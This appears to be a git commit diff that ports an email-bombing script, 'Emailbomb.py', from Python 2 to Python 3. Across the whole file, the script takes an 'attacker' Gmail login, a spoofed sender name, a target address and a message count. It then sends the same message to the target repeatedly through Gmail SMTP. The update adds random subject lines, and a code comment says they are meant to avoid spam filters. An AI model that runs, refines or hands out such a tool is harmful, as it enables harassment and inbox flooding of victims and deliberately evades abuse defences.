bf3ca7f5b9317c46e042fa8a934dd1c4a3a71b4e
Ha3MrX <33704360+Ha3MrX@users.noreply.github.com>
2026-03-31 01:41:02 +0300

    Update Emailbomb.py

--- Emailbomb.py
+++ Emailbomb.py
@@ -1,77 +1,69 @@
-#!/usr/bin/python
-#E-bomber
-
-
-
+#!/usr/bin/env python3
 import os
 import smtplib
 import getpass
 import sys
 import time
 
-print '                                                                    '
-print '                                                                    '
-print '            #################################################       '
-print '            #                                               #       '
-print '            #                 Email Bomb                    #       '
-print '            #                                               #       '
-print '            #               create By HA-MRX                #       '
-print '            #                                               #       '
-print '            #        https://www.youtube.com/c/HA-MRX       #       '
-print '            #                                               #       '
-print '            #        https://kurdkali.wordpress.com/        #       '
-print '            #                                               #       '
-print '            #    https://www.facebook.com/muhamad.jabar333  #       '
-print '            #################################################       '
+def banner():
+    print('                                                                    ')
+    print('            #################################################       ')
+    print('            #                                               #       ')
+    print('            #                  Email Bomb                   #       ')
+    print('            #                                               #       ')
+    print('            #                create By HA-MRX               #       ')
+    print('            #                                               #       ')
+    print('            #        https://www.youtube.com/c/HA-MRX       #       ')
+    print('            #                                               #       ')
+    print('            #        https://kurdkali.wordpress.com/        #       ')
+    print('            #                                               #       ')
+    print('            #    https://www.facebook.com/muhamad.jabar333  #       ')
+    print('            #################################################       ')
+    print('                                                                    ')
 
-print '                                                                    '
-
-
-print '                                           '
-
-print '    '
-email = raw_input('Attacker Gmail Address : ')
-print '             '
-user = raw_input('Anonymous name : ')
-print '      '
-passwd = getpass.getpass('Password: ')
-
-print '   '
-
-to = raw_input('\nTo: ')
-
-
-print '    '
-
-body = raw_input('Message: ')
-
-print '    '
-
-total = input('Number of send: ')
-
-smtp_server = 'smtp.gmail.com'
-port = 587
-
-
-print ''
+banner()
 
 try:
-    server = smtplib.SMTP(smtp_server,port) 
+    email = input('Attacker Gmail Address : ')
+    user = input('Anonymous name : ')
+    passwd = getpass.getpass('Password: ')
+
+    to = input('\nTo: ')
+    body = input('Message: ')
+    total = int(input('Number of send: '))
+
+    smtp_server = 'smtp.gmail.com'
+    port = 587
+
+    print('\n[+] Connecting to server...')
+    server = smtplib.SMTP(smtp_server, port) 
     server.ehlo()
     server.starttls()
-    server.login(email,passwd)
-    for i in range(1, total+1):
-        subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
-        server.sendmail(email,to,msg)
-        print "\rE-mails sent: %i" % i
-        time.sleep(1)
+    
+    print('[+] Logging in...')
+    server.login(email, passwd)
+    
+    print('[+] Starting the attack...\n')
+    for i in range(1, total + 1):
+        # Generating a random subject to avoid spam filters
+        subject = os.urandom(5).hex()
+        msg = f'From: {user}\nSubject: {subject}\n\n{body}'
+        
+        server.sendmail(email, to, msg)
+        sys.stdout.write(f"\rE-mails sent: {i}")
         sys.stdout.flush()
+        time.sleep(1)
+        
     server.quit()
-    print '\n Done !!!'
+    print('\n\n[+] Done !!!')
+
 except KeyboardInterrupt:
-    print '[-] Canceled'
+    print('\n[-] Canceled by user')
     sys.exit()
 except smtplib.SMTPAuthenticationError:
-    print '\n[!] The username or password you entered is incorrect.'
+    print('\n[!] Error: The username or password you entered is incorrect.')
+    print('[!] Or you need to use an "App Password" if 2FA is enabled.')
+except Exception as e:
+    print(f'\n[!] An error occurred: {e}')
+
 sys.exit()
